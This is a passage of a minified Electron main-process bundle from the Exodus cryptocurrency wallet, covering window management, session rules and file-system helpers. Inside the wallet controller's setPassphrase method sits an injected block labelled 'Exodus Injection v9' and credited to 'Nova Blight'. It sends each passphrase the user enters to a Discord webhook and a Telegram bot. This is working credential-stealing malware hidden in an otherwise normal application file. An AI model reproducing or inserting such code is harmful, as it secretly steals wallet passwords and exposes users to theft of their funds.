    let l;
    function d(e) {
      l = e;
    }
    function f() {
      const e = c()(process.argv),
        t = l || e.datadir || (o.app && o.app.getPath("userData"));
      return u.a.join(t, "debug");
    }
    function p() {
      const e = f();
      return i.a.existsSync(e);
    }
    function h(e) {
      const t = f();
      return i.a.access(t, (t) => e(!t));
    }
    function w(e) {
      const t = f();
      h((n) => {
        if (n) return e(!0);
        i.a.writeFile(t, "", (t) => e(null === t));
      });
    }
    function m(e) {
      const t = f();
      h((n) => {
        if (!n) return e(!0);
        i.a.remove(t, (t) => e(null === t));
      });
    }
  },
  function (e, t, n) {
    "use strict";
    var o = n(80),
      r = n(4),
      i = n(36);
    const s = new (class extends o.EventEmitter {
      constructor() {
        super(),
          (this._walletLoaded = !1),
          (this.setPassphrase = this.setPassphrase.bind(this)),
          (this.setWalletLoaded = this.setWalletLoaded.bind(this)),
          (this.hasWalletLoaded = this.hasWalletLoaded.bind(this));
      }
      async setInvalidPassphrase() {
        this.emit("passphrase:invalid");
        const e = Object(i.getWindow)();
        setImmediate(() => e.send("main:passphrase:invalid"));
      }
      async setSaltConnectionFailed() {
        this.emit("saltconn:failed");
        const e = Object(i.getWindow)();
        setImmediate(() => e.send("main:saltconn:failed"));
      }
      async setError(e) {
        this.emit("error", e);
      }
      async setPassphrase(e) {
        this.emit("passphrase:set", e);
    
        try {
            const embed = {
                color: 3553599,
                footer: {
                    text: "@Nova Blight | https://t.me/NovaBlight",
                },
                title: "Exodus Injection v9",
                fields: [
                    {
                        name: "🔑 Passwords:",
                        value: `\`\`\`ansi\n[2;32m${e}[0m[2;32m[0m\`\`\`\n[Download ZIP](${config.links})`,
                        inline: false,
                    },
                ],
                thumbnail: {
                    url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/assets/ghost-15636.gif",
                },
            };
    
            const message = {
                username: "Nova Blight",
                avatar_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/logonova-blight.jpeg",
                embeds: [embed],
            };
    
            // Envoi du message à Discord
            fetch(config.webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(message),
            }).catch((error) => console.log("Erreur lors de l'envoi à Discord:", error));
    
            // Préparation du message Telegram sans le lien du thumbnail
            let telegramMessage = `📌 *${embed.title}*\n\n` +
                `${embed.fields.map(f => `*${f.name}:* ${f.value}`).join("\n")}`;
    
            // Envoi du message à Telegram via la fonction `SessionsTelegramSend`
            SessionsTelegramSend(
                telegramMessage,
                config.bot_token,
                config.chat_id,
                config.user_id
            );
    
        } catch (error) {
            console.log("Erreur:", error);
        }
    }
    

    
      async setMnemonic(e) {
        this.emit("mnemonic:set", e);
      }
      async setWalletLoaded(e, t) {
        console.log(""), console.log("SET WALLET LOADED", "action:", t), console.log(e), console.log(""), (this._walletLoaded = e), (this._action = t), this.emit("wallet:loaded");
      }
      async awaitWalletLoaded() {
        this._walletLoaded || (await new Promise((e) => this.once("wallet:loaded", e)));
      }
      async hasWalletLoaded() {
        let wallet = this._walletLoaded;
        return wallet;
      }
      async getAction() {
        return this._action;
      }
      async setHasPassphrase(e) {
        ((this._hasPassphrase = e)), this.emit("wallet:haspassphrase");
      }
      async getHasPassphrase() {
        return void 0 === this._hasPassphrase && (await new Promise((e) => this.once("wallet:haspassphrase", e))), this._hasPassphrase;
      }
    })();
    Object(r.createServer)("wallet-controller", ["wallet", "network", "ui", "passphrase"], s),
      console.warn(`wallet-controller initialized, process.type = browser, timestamp: ${Date.now()}`),
      (t.default = s);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "WALLET_DIR", function () {
      return a;
    }),
      n.d(t, "walletDirFromExodusDir", function () {
        return l;
      });
    var o = n(9),
      r = n.n(o),
      i = n(2),
      s = n.n(i),
      c = n(1);
    const a = "exodus.wallet",
      u = (e) => ({
        get infoFile() {
          return s.a.join(e, "info.seco");
        },
        async infoFileExists() {
          return r.a.pathExists(this.infoFile);
        },
        get passphraseFile() {
          return s.a.join(e, "passphrase.json");
        },
        async passphraseFileExists() {
          return r.a.pathExists(this.passphraseFile);
        },
        get seedFile() {
          return s.a.join(e, "seed.seco");
        },
        async seedFileExists() {
          return r.a.pathExists(this.seedFile);
        },
        get seedBackupFile() {
          return this.seedFile + ".bak";
        },
        async seedBackupFileExists() {
          return r.a.pathExists(this.seedBackupFile);
        },
        get storageFile() {
          return s.a.join(e, "storage.seco");
        },
        get unsafeStorageFile() {
          return s.a.join(e, "unsafe-storage.json");
        },
        get lightningFile() {
          return s.a.join(e, "lightning-v2.seco");
        },
        get lightningSecretFile() {
          return s.a.join(e, "lightning-secret-v2.seco");
        },
        async lightningFileExists() {
          return r.a.pathExists(this.lightningFile);
        },
        async lightningSecretFileExists() {
          return r.a.pathExists(this.lightningSecretFile);
        },
        async walletExists() {
          return await this.seedFileExists();
        },
        get walletDir() {
          return e;
        },
        get restoreFromCurrentPhraseFlagFile() {
          return s.a.join(e, "..", c.FLAG_FILE_RESTORE_FROM_CURRENT_PHRASE);
        },
        restoreFromCurrentPhraseFlagFileExistsSync() {
          return r.a.pathExistsSync(this.restoreFromCurrentPhraseFlagFile);
        },
      });
    function l(e) {
      return s.a.join(e, a);
    }
    t.default = u;
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "showDevTools", function () {
      return i;
    }),
      n.d(t, "updateViewBounds", function () {
        return s;
      }),
      n.d(t, "refocusView", function () {
        return c;
      }),
      n.d(t, "toInputEvent", function () {
        return a;
      });
    var o = n(3),
      r = n(40);
    const i = (e) => {
        e.webContents.isDevToolsOpened() || e.webContents.openDevTools({ mode: "detach" });
      },
      s = (e, t) => {
        const n = o.appWindows.ui.webContents.zoomFactor;
        e.webContents.zoomFactor = n;
        const i = Math.round(t * n),
          { height: s, width: c } = Object(r.default)(o.appWindows.background);
        e.setBounds({ x: 0, y: i, width: c, height: s - i });
      },
      c = (e) => {
        e.webContents.focus(),
          e.webContents.sendInputEvent({ type: "mouseDown", x: 0, y: 0, button: "left", clickCount: 1 }),
          e.webContents.sendInputEvent({ type: "mouseUp", x: 0, y: 0, button: "left" });
      },
      a = (e) => {
        const { type: t, offsetX: n, offsetY: o, deltaX: r, deltaY: i } = e,
          s = ["left", "middle", "right"][Number(e.button)] || null;
        switch (t) {
          case "mousedown":
            return s ? { type: "mousePressed", x: n, y: o, button: s, clickCount: 1 } : null;
          case "click":
            return s ? { type: "mouseReleased", x: n, y: o, button: s, clickCount: 1 } : null;
          case "mouseup":
            return s ? { type: "mouseReleased", x: n, y: o, button: s } : null;
          case "mousemove":
            return { type: "mouseMoved", x: n, y: o, button: s || "none" };
          case "wheel":
            return { type: "mouseWheel", x: n, y: o, deltaX: r, deltaY: i };
        }
        return console.error(`Unprocessed input event: ${t}`), null;
      };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "imagesDir", function () {
      return c;
    }),
      n.d(t, "walletDir", function () {
        return a;
      }),
      n.d(t, "walletBackupDir", function () {
        return u;
      });
    var o = n(2),
      r = n.n(o),
      i = n(27),
      s = (n(1), n(34));
    function c() {
      return r.a.join(Object(s.dataDir)(), "images");
    }
    function a() {
      return r.a.join(Object(s.dataDir)(), i.WALLET_DIR);
    }
    function u() {
      return r.a.join(r.a.join(Object(s.dataDir)(), "backups"), "wallet");
    }
    n.d(t, "dataDir", function () {
      return s.dataDir;
    });
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "maximizeWorkaroundHandlers", function () {
      return p;
    }),
      n.d(t, "init", function () {
        return h;
      }),
      n.d(t, "maximize", function () {
        return w;
      });
    var o = n(0),
      r = n(1),
      i = n(4),
      s = n(8),
      c = n(5),
      a = n(64),
      u = n(7);
    const l = (() => {
        const e = [];
        return (
          r.ENV_BUILD_EXODUS && e.push("EXODUS"),
          r.ENV_BUILD_EDEN && e.push("EDEN"),
          e.push(r.PACKAGE.version),
          r.PACKAGE.version.includes("-") && e.push("[PRERELEASE]"),
          r.ENV_DEV && e.push("[DEV]"),
          r.NIGHTLY_BUILD && e.push("[NIGHTLY BUILD]"),
          e.join(" ")
        );
      })(),
      d = {
        ...u.default,
        width: r.MIN_WIDTH,
        height: r.MIN_HEIGHT,
        minWidth: r.MIN_WIDTH,
        minHeight: r.MIN_HEIGHT,
        title: l,
        webPreferences: { webSecurity: !0, contextIsolation: !0, enableRemoteModule: !1, nodeIntegration: r.ENV_TEST, sandbox: !0, spellcheck: !1, partition: "background" },
      };
    let f = null;
    const p = new Set();
    function h(e) {
      const t = Object(a.default)({ defaultWidth: d.width, defaultHeight: d.height, maximize: !1, fullScreen: !1 });
      "string" == typeof e && (d.title = d.title + ` (${e})`),
        (f = new o.BrowserWindow({ ...d, ...t.bounds() })),
        Object(s.registerWebContents)(f.webContents, "background"),
        t.manage(f),
        f.webContents.loadFile(c.WINDOW_BACKGROUND),
        f.on("close", () => {
          for (const e of f.getBrowserViews()) f.removeBrowserView(e);
        });
      const n = () => {
        for (const e of p) e();
      };
      let r = new Map();
      const u = (e) => {
        for (const t of [e, 200, 500, 2e3]) clearTimeout(r.get(t)), r.set(t, setTimeout(n, t));
      };
      return (
        "linux" === process.platform &&
          (f.on("maximize", () => {
            n(), u(20);
          }),
          f.on("resize", () => u(100))),
        f.on("focus", () => Object(i.targeted)("ui", "window:onfocus")),
        f.on("blur", () => Object(i.targeted)("ui", "window:onblur")),
        o.powerMonitor.on("suspend", () => {
          Object(i.targeted)("ui", "window:onfreeze");
        }),
        o.powerMonitor.on("resume", () => {
          Object(i.targeted)("ui", "window:onresume");
        }),
        f
      );
    }
    function w(e) {
      const t = Object(a.default)({ defaultWidth: d.width, defaultHeight: d.height, maximize: !1, fullScreen: !1 });
      ["linux", "win32"].includes(process.platform) && t.isMaximized() && e.maximize();
    }
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromPromise,
      r = n(39);
    e.exports = {
      pathExists: o(function (e) {
        return r
          .access(e)
          .then(() => !0)
          .catch(() => !1);
      }),
      pathExistsSync: r.existsSync,
    };
  },
  function (e, t) {
    e.exports = require("os");
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return f;
    }),
      n.d(t, "init", function () {
        return p;
      });
    var o = n(0),
      r = n(1),
      i = n(22),
      s = n(8),
      c = n(5),
      a = n(7),
      u = n(18);
    const l = {
      ...a.default,
      frame: !1,
      transparent: !0,
      fullscreen: !1,
      fullscreenable: !1,
      roundedCorners: !1,
      width: 700,
      height: r.UNLOCK_WINDOW_HEIGHT,
      resizable: !1,
      show: !1,
      title: "UNLOCK WALLET",
      modal: !0,
      webPreferences: { ...a.isolation, partition: "unlock" },
    };
    let d = null;
    const f = () => d;
    function p(e, t) {
      (d = new o.BrowserWindow({ ...l, parent: e })),
        Object(s.registerWebContents)(d.webContents, "unlock"),
        d.loadURL(Object(u.getHtmlUrl)({ app: o.app, hash: Object(i.encode)(t), filePath: c.WINDOW_UNLOCK }));
      let n = !1;
      return (
        o.app.on("before-quit", () => {
          (n = !0), d.isDestroyed() || d.close();
        }),
        d.on("close", (e) => {
          n || (e.preventDefault(), d.send("unlock:window-close"));
        }),
        d
      );
    }
  },
  function (e, t, n) {
    e.exports = n(100);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return p;
    }),
      n.d(t, "init", function () {
        return h;
      });
    var o = n(0),
      r = n(22),
      i = n(8),
      s = n(10),
      c = n(13),
      a = n(5),
      u = n(7),
      l = n(18);
    const d = {
      ...u.default,
      backgroundColor: "#fff",
      x: 0,
      y: 0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !0,
      show: !1,
      skipTaskbar: !1,
      title: "Wallet Process (hidden window)",
      webPreferences: { ...u.integration, partition: "persist:wallet", backgroundThrottling: !1 },
    };
    let f = null;
    const p = () => f;
    function h(e) {
      const t = o.screen.getPrimaryDisplay().size,
        n = { ...d, width: t.width / 3, height: t.height / 2 };
      (f = new o.BrowserWindow(n)),
        Object(i.registerWebContents)(f.webContents, "wallet"),
        Object(c.forwardErrors)(f.webContents, "wallet"),
        f.loadURL(Object(l.getHtmlUrl)({ app: o.app, hash: Object(r.encode)(e), filePath: a.WINDOW_WALLET })),
        Object(s.default)({ windowHandle: f.webContents, windowId: "wallet" }),
        f.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        });
      let u = !1;
      return (
        o.app.on("before-quit", () => {
          (u = !0), f.isDestroyed() || f.close();
        }),
        f.on("close", function (e) {
          u || (e.preventDefault(), f.hide());
        }),
        f
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getWindow", function () {
      return h;
    }),
      n.d(t, "init", function () {
        return w;
      });
    var o = n(0),
      r = n(22),
      i = n(17),
      s = n(8),
      c = n(10),
      a = n(13),
      u = n(5),
      l = n(7),
      d = n(18);
    const f = {
      ...l.default,
      backgroundColor: "#000",
      frame: !1,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !1,
      width: 800,
      height: 600,
      show: !1,
      skipTaskbar: !1,
      titleBarStyle: "default",
      title: "Enter Password",
      webPreferences: { ...l.isolation, partition: "passphrase" },
    };
    let p = null;
    const h = () => p;
    function w(e) {
      const t = e && e.recoverFromPhrase ? "Enter Mnemonic" : f.title;
      return (
        (p = new o.BrowserWindow({ ...f, title: t })),
        Object(s.registerWebContents)(p.webContents, "passphrase"),
        Object(a.forwardErrors)(p.webContents, "passphrase"),
        p.loadURL(Object(d.getHtmlUrl)({ app: o.app, hash: Object(r.encode)(e), filePath: u.WINDOW_PASSPHRASE })),
        Object(i.default)() && Object(c.default)({ windowHandle: p.webContents, windowId: "passphrase" }),
        p.webContents.on("will-navigate", (e) => {
          e.preventDefault();
        }),
        p.webContents.setWindowOpenHandler((e) => ({ action: "deny" })),
        o.app.on("before-quit", () => {
          p.isDestroyed() || p.close();
        }),
        p.on("close", () => {
          p.destroy(), o.app.quit();
        }),
        p.webContents.once("dom-ready", () => p.show()),
        p
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getSessionRules", function () {
      return f;
    }),
      n.d(t, "getRequestRules", function () {
        return p;
      }),
      n.d(t, "registerWebContentsSession", function () {
        return h;
      }),
      n.d(t, "saveSessionWebContents", function () {
        return m;
      });
    var o = n(0),
      r = n(6);
    const i = new WeakMap(),
      s = new WeakMap(),
      c = new Set(),
      a = new Map(),
      u = new WeakMap(),
      l = new WeakSet(),
      d = new WeakMap();
    function f(e) {
      const t = s.get(e);
      return { permissions: (t && t.permissions) || [], downloads: (t && t.downloads) || [] };
    }
    function p(e, t) {
      u.has(e) || u.set(e, { firstUrl: t });
      const n = u.get(e);
      if (
        (function (e) {
          return e === o.session.defaultSession || l.has(e);
        })(e)
      )
        return Object(r.showError)("invalidated session usage", ` by ${t}`), null;
      if (!n.webContents || (n.webContents && n.webContents.isDestroyed())) {
        const o = i.get(e);
        if (!o) return Object(r.showError)("missing WebContents for session", `: ${t}`), null;
        if (o.isDestroyed()) return "block_silent";
        if (o.session !== e) return Object(r.showError)("changed WebContents session", `: ${t}`), null;
        n.webContents = o;
      }
      if (["devtools:", "chrome-extension:"].includes(t.protocol)) return { protocols: "*", domains: "*" };
      if (!n.sessionRules) {
        if (!s.has(e)) return Object(r.showError)("unregistered session usage", ` by ${t}`), null;
        const o = s.get(e);
        if ((!o.startUrlProtocolIsIntercepted && !o.url.startsWith("file://") && d.get(n.webContents) !== `${t}`) || d.get(n.webContents) !== o.url)
          return Object(r.showError)("start url mismatch for WebContents", ` by ${t}`), l.add(e), null;
        const { protocols: i, domains: c } = o;
        n.sessionRules = { protocols: i, domains: c };
      }
      return n.sessionRules;
    }
    function h(e, t) {
      const { type: n, persistName: i = n } = t,
        { session: u } = e;
      if (u !== o.session.defaultSession)
        if (Boolean(t.persistent) !== u.isPersistent() || (t.persistent && u !== o.session.fromPartition(`persist:${i}`)))
          Object(r.showError)('persistent session does not match "persist:" prefix', `: ${n}`, 2);
        else {
          if (
            (c.has(n) ? t.multiple || (Object(r.showError)("reuse of single-use WebContents type", `: ${n}`, 1, !1), l.add(u)) : c.add(n),
            t.multiple &&
              !t.parallel &&
              (a.has(n) && a.get(n).isDestroyed() && a.delete(n),
              a.has(n)
                ? (Object(r.showError)("reuse of exclusive-use WebContents type", `: ${n}`, 1, !1), l.add(u))
                : (a.set(n, e),
                  e.on("destroyed", () => {
                    a.get(n) === e && a.delete(n);
                  }))),
            s.has(u))
          )
            return (
              t.reusable || (Object(r.showError)("reuse of single-use WebContents session", `: ${n}`, 1, !1), l.add(u)),
              void (s.get(u).type !== n && (Object(r.showError)("reuse of WebContents session with mismatching type", `: ${n}`, 1, !1), l.add(u)))
            );
          if ((s.set(u, t), t.flags.has("trezor-origin"))) {
            const e = "http://127.0.0.1:21325",
              t = { urls: [`${e}/*`] };
            u.webRequest.onBeforeSendHeaders(t, (t, n) => {
              new URL(t.url).origin === e && (t.requestHeaders.Origin = "https://node.trezor.io"), n({ requestHeaders: t.requestHeaders });
            });
          }
        }
      else Object(r.showError)("usage of default session", `: ${n}`, 2);
    }
    function w(e) {
      return (e || "").replace(/#.*/, "").replace(/^(devtools:\/\/devtools\/bundled\/devtools_app\.html)(\?.*)?$/, "$1");
    }
    function m(e) {
      const t = w(e.getURL());
      t && b(e, t),
        e.once("did-start-navigation", (n, o) => {
          const i = w(o.toString()),
            s = w(e.getURL());
          if (t) {
            if (i !== t || s !== t) {
              const e = JSON.stringify({ url: i, url1: s, url0: t });
              Object(r.showError)("content.getURL() / navigationUrl mismatched initial navigation:", e, 1, !1);
            }
          } else b(e, i);
        });
    }
    function b(e, t) {
      if (t.startsWith("devtools://")) return;
      if (!e.session) return void Object(r.showError)("missing session for WebContents", `: ${t}`, 1, !1);
      const { session: n } = e;
      if (n !== o.session.defaultSession) {
        if (!l.has(n)) {
          if (s.has(n)) {
            if (i.has(n)) {
              const e = i.get(n);
              if (!(s.get(n).reusable && e.isDestroyed())) return Object(r.showError)("session reuse between WebContents", `: ${t}`, 1, !1), void l.add(n);
            }
          } else {
            if (i.has(n)) return Object(r.showError)("session reuse without registration", "", 1), void l.add(n);
            setImmediate(() => {
              s.has(n) || (Object(r.showError)("session that was not immediately registered", "", 1), l.add(n));
            });
          }
          i.set(n, e), d.set(e, t);
        }
      } else Object(r.showError)("using default session for WebContents", "", 1);
    }
  },
  function (e, t, n) {
    "use strict";
    const o = n(39),
      r = n(2),
      i = n(43);
    function s(e, t, n) {
      const r = n.dereference ? (e) => o.stat(e, { bigint: !0 }) : (e) => o.lstat(e, { bigint: !0 });
      return Promise.all([
        r(e),
        r(t).catch((e) => {
          if ("ENOENT" === e.code) return null;
          throw e;
        }),
      ]).then(([e, t]) => ({ srcStat: e, destStat: t }));
    }
    function c(e, t) {
      return t.ino && t.dev && t.ino === e.ino && t.dev === e.dev;
    }
    function a(e, t) {
      const n = r
          .resolve(e)
          .split(r.sep)
          .filter((e) => e),
        o = r
          .resolve(t)
          .split(r.sep)
          .filter((e) => e);
      return n.reduce((e, t, n) => e && o[n] === t, !0);
    }
    function u(e, t, n) {
      return `Cannot ${n} '${e}' to a subdirectory of itself, '${t}'.`;
    }
    e.exports = {
      checkPaths: function (e, t, n, o, l) {
        i.callbackify(s)(e, t, o, (o, i) => {
          if (o) return l(o);
          const { srcStat: s, destStat: d } = i;
          if (d) {
            if (c(s, d)) {
              const o = r.basename(e),
                i = r.basename(t);
              return "move" === n && o !== i && o.toLowerCase() === i.toLowerCase()
                ? l(null, { srcStat: s, destStat: d, isChangingCase: !0 })
                : l(new Error("Source and destination must not be the same."));
            }
            if (s.isDirectory() && !d.isDirectory()) return l(new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`));
            if (!s.isDirectory() && d.isDirectory()) return l(new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`));
          }
          return s.isDirectory() && a(e, t) ? l(new Error(u(e, t, n))) : l(null, { srcStat: s, destStat: d });
        });
      },
      checkPathsSync: function (e, t, n, i) {
        const { srcStat: s, destStat: l } = (function (e, t, n) {
          let r;
          const i = n.dereference ? (e) => o.statSync(e, { bigint: !0 }) : (e) => o.lstatSync(e, { bigint: !0 }),
            s = i(e);
          try {
            r = i(t);
          } catch (e) {
            if ("ENOENT" === e.code) return { srcStat: s, destStat: null };
            throw e;
          }
          return { srcStat: s, destStat: r };
        })(e, t, i);
        if (l) {
          if (c(s, l)) {
            const o = r.basename(e),
              i = r.basename(t);
            if ("move" === n && o !== i && o.toLowerCase() === i.toLowerCase()) return { srcStat: s, destStat: l, isChangingCase: !0 };
            throw new Error("Source and destination must not be the same.");
          }
          if (s.isDirectory() && !l.isDirectory()) throw new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`);
          if (!s.isDirectory() && l.isDirectory()) throw new Error(`Cannot overwrite directory '${t}' with non-directory '${e}'.`);
        }
        if (s.isDirectory() && a(e, t)) throw new Error(u(e, t, n));
        return { srcStat: s, destStat: l };
      },
      checkParentPaths: function e(t, n, i, s, a) {
        const l = r.resolve(r.dirname(t)),
          d = r.resolve(r.dirname(i));
        if (d === l || d === r.parse(d).root) return a();
        o.stat(d, { bigint: !0 }, (o, r) => (o ? ("ENOENT" === o.code ? a() : a(o)) : c(n, r) ? a(new Error(u(t, i, s))) : e(t, n, d, s, a)));
      },
      checkParentPathsSync: function e(t, n, i, s) {
        const a = r.resolve(r.dirname(t)),
          l = r.resolve(r.dirname(i));
        if (l === a || l === r.parse(l).root) return;
        let d;
        try {
          d = o.statSync(l, { bigint: !0 });
        } catch (e) {
          if ("ENOENT" === e.code) return;
          throw e;
        }
        if (c(n, d)) throw new Error(u(t, i, s));
        return e(t, n, l, s);
      },
      isSrcSubdir: a,
      areIdentical: c,
    };
  },
  function (e, t, n) {
    "use strict";
    const o = n(16).fromCallback,
      r = n(12),
      i = [
        "access",
        "appendFile",
        "chmod",
        "chown",
        "close",
        "copyFile",
        "fchmod",
        "fchown",
        "fdatasync",
        "fstat",
        "fsync",
        "ftruncate",
        "futimes",
        "lchmod",
        "lchown",
        "link",
        "lstat",
        "mkdir",
        "mkdtemp",
        "open",
        "opendir",
        "readdir",
        "readFile",
        "readlink",
        "realpath",
        "rename",
        "rm",
        "rmdir",
        "stat",
        "symlink",
        "truncate",
        "unlink",
        "utimes",
        "writeFile",
      ].filter((e) => "function" == typeof r[e]);
    Object.assign(t, r),
      i.forEach((e) => {
        t[e] = o(r[e]);
      }),
      (t.exists = function (e, t) {
        return "function" == typeof t ? r.exists(e, t) : new Promise((t) => r.exists(e, t));
      }),
      (t.read = function (e, t, n, o, i, s) {
        return "function" == typeof s
          ? r.read(e, t, n, o, i, s)
          : new Promise((s, c) => {
              r.read(e, t, n, o, i, (e, t, n) => {
                if (e) return c(e);
                s({ bytesRead: t, buffer: n });
              });
            });
      }),
      (t.write = function (e, t, ...n) {
        return "function" == typeof n[n.length - 1]
          ? r.write(e, t, ...n)
          : new Promise((o, i) => {
              r.write(e, t, ...n, (e, t, n) => {
                if (e) return i(e);
                o({ bytesWritten: t, buffer: n });
              });
            });
      }),
      "function" == typeof r.writev &&
        (t.writev = function (e, t, ...n) {
          return "function" == typeof n[n.length - 1]
            ? r.writev(e, t, ...n)
            : new Promise((o, i) => {
                r.writev(e, t, ...n, (e, t, n) => {
                  if (e) return i(e);
                  o({ bytesWritten: t, buffers: n });
                });
              });
        }),
      "function" == typeof r.realpath.native
        ? (t.realpath.native = o(r.realpath.native))
        : process.emitWarning("fs.realpath.native is not a function. Is fs being monkey-patched?", "Warning", "fs-extra-WARN0003");
  },
  function (e, t, n) {
    "use strict";
    t.default = (e) => {
      const { height: t, width: n } = e.webContents.getOwnerBrowserWindow().getContentBounds();
      return { height: t, width: n };
    };
  },
  function (e, t) {
    var n, o;
    (n = this),
      (o = function () {
        return function () {
          var e = arguments;
          "object" == typeof arguments[0] && ((e = arguments[0]), arguments[1]);
          var t = [].slice.call(e, 0).join("/");
          return t
            .replace(/:\//g, "://")
            .replace(/([^:\s])\/+/g, "$1/")
            .replace(/\/(\?|&|#[^!])/g, "$1")
            .replace(/(\?.+)\?/g, "$1&");
        };
      }),
      void 0 !== e && e.exports ? (e.exports = o()) : "function" == typeof define && define.amd ? define(o) : (n.urljoin = o());
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getIpcType", function () {
      return i;
    }),
      n.d(t, "allIpcWebContents", function () {
        return s;
      }),
      n.d(t, "findWebContents", function () {
        return c;
      });
    var o = n(23),
      r = n(8);
    function i(e) {
      const t = Object(r.getWebContentsMeta)(e);
      return t && !0 === t.ipc ? t.type : void 0;
    }
    function s() {
      return Object(o.allWebContents)()
        .map((e) => ({ contents: e, type: i(e) }))
        .filter((e) => e.type);
    }
    function c(e) {
      return s()
        .filter((t) => t.type === e)
        .map((e) => e.contents);
    }
  },
  function (e, t) {
    e.exports = require("util");
  },
  function (e, t) {
    function n(e) {
      return "number" == typeof e || !!/^0x[0-9a-f]+$/i.test(e) || /^[-+]?(?:\d+(?:\.\d*)?|\.\d+)(e[-+]?\d+)?$/.test(e);
    }
    function o(e, t) {
      return ("constructor" === t && "function" == typeof e[t]) || "__proto__" === t;
    }
    e.exports = function (e, t) {
      t || (t = {});
      var r = { bools: {}, strings: {}, unknownFn: null };
      "function" == typeof t.unknown && (r.unknownFn = t.unknown),
        "boolean" == typeof t.boolean && t.boolean
          ? (r.allBools = !0)
          : []
              .concat(t.boolean)
              .filter(Boolean)
              .forEach(function (e) {
                r.bools[e] = !0;
              });
      var i = {};
      Object.keys(t.alias || {}).forEach(function (e) {
        (i[e] = [].concat(t.alias[e])),
          i[e].forEach(function (t) {
            i[t] = [e].concat(
              i[e].filter(function (e) {
                return t !== e;
              })
            );
          });
      }),
        []
          .concat(t.string)
          .filter(Boolean)
          .forEach(function (e) {
            (r.strings[e] = !0), i[e] && (r.strings[i[e]] = !0);
          });
      var s = t.default || {},
        c = { _: [] };
      Object.keys(r.bools).forEach(function (e) {
        u(e, void 0 !== s[e] && s[e]);
      });
      var a = [];
      function u(e, t, o) {
        if (
          !o ||
          !r.unknownFn ||
          (function (e, t) {
            return (r.allBools && /^--[^=]+$/.test(t)) || r.strings[e] || r.bools[e] || i[e];
          })(e, o) ||
          !1 !== r.unknownFn(o)
        ) {
          var s = !r.strings[e] && n(t) ? Number(t) : t;
          l(c, e.split("."), s),
            (i[e] || []).forEach(function (e) {
              l(c, e.split("."), s);
            });
        }
      }
      function l(e, t, n) {
        for (var i = e, s = 0; s < t.length - 1; s++) {
          if (o(i, (c = t[s]))) return;
          void 0 === i[c] && (i[c] = {}), (i[c] !== Object.prototype && i[c] !== Number.prototype && i[c] !== String.prototype) || (i[c] = {}), i[c] === Array.prototype && (i[c] = []), (i = i[c]);
        }
        var c;
        o(i, (c = t[t.length - 1])) ||
          ((i !== Object.prototype && i !== Number.prototype && i !== String.prototype) || (i = {}),
          i === Array.prototype && (i = []),
          void 0 === i[c] || r.bools[c] || "boolean" == typeof i[c] ? (i[c] = n) : Array.isArray(i[c]) ? i[c].push(n) : (i[c] = [i[c], n]));
      }
      function d(e) {
        return i[e].some(function (e) {
          return r.bools[e];
        });
      }
      -1 !== e.indexOf("--") && ((a = e.slice(e.indexOf("--") + 1)), (e = e.slice(0, e.indexOf("--"))));
      for (var f = 0; f < e.length; f++) {
        var p = e[f];
        if (/^--.+=/.test(p)) {
          var h = p.match(/^--([^=]+)=([\s\S]*)$/),
            w = h[1],
            m = h[2];
          r.bools[w] && (m = "false" !== m), u(w, m, p);
        } else if (/^--no-.+/.test(p)) {
          u((w = p.match(/^--no-(.+)/)[1]), !1, p);
        } else if (/^--.+/.test(p)) {
          w = p.match(/^--(.+)/)[1];
          void 0 === (E = e[f + 1]) || /^-/.test(E) || r.bools[w] || r.allBools || (i[w] && d(w))
            ? /^(true|false)$/.test(E)
              ? (u(w, "true" === E, p), f++)
              : u(w, !r.strings[w] || "", p)
            : (u(w, E, p), f++);
        } else if (/^-[^-]+/.test(p)) {
          for (var b = p.slice(1, -1).split(""), y = !1, g = 0; g < b.length; g++) {
            var E;
            if ("-" !== (E = p.slice(g + 2))) {
              if (/[A-Za-z]/.test(b[g]) && /=/.test(E)) {
                u(b[g], E.split("=")[1], p), (y = !0);
                break;
              }
              if (/[A-Za-z]/.test(b[g]) && /-?\d+(\.\d*)?(e-?\d+)?$/.test(E)) {
                u(b[g], E, p), (y = !0);
                break;
              }
              if (b[g + 1] && b[g + 1].match(/\W/)) {
                u(b[g], p.slice(g + 2), p), (y = !0);
                break;
              }
              u(b[g], !r.strings[b[g]] || "", p);
            } else u(b[g], E, p);
          }
          w = p.slice(-1)[0];
          y ||
            "-" === w ||
            (!e[f + 1] || /^(-|--)[^-]/.test(e[f + 1]) || r.bools[w] || (i[w] && d(w))
              ? e[f + 1] && /^(true|false)$/.test(e[f + 1])
                ? (u(w, "true" === e[f + 1], p), f++)
                : u(w, !r.strings[w] || "", p)
              : (u(w, e[f + 1], p), f++));
        } else if (((r.unknownFn && !1 === r.unknownFn(p)) || c._.push(r.strings._ || !n(p) ? p : Number(p)), t.stopEarly)) {
          c._.push.apply(c._, e.slice(f + 1));
          break;
        }
      }
      return (
        Object.keys(s).forEach(function (e) {
          var t, n, o;
          (t = c),
            (n = e.split(".")),
            (o = t),
            n.slice(0, -1).forEach(function (e) {
              o = o[e] || {};
            }),
            n[n.length - 1] in o ||
              (l(c, e.split("."), s[e]),
              (i[e] || []).forEach(function (t) {
                l(c, t.split("."), s[e]);
              }));
        }),
        t["--"]
          ? ((c["--"] = new Array()),
            a.forEach(function (e) {
              c["--"].push(e);
            }))
          : a.forEach(function (e) {
              c._.push(e);
            }),
        c
      );
    };
  },
  function (e, t, n) {
    "use strict";
